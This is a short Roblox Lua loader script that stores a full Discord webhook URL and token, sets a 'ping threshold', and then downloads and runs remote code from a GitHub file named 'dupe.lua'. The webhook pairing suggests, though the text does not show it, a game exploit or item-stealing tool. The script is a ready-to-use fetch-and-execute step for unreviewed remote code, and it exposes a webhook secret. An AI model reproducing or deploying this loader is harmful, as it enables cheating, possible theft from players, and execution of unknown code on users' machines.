local Webhook = "https://discord.com/api/webhooks/1439327535346225297/KIu22qyYmki_EsqVyJqS0LnSRThDScROgMTm95Az78NCVsZxqj9tRbbrqp3nX2lrxrjT"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
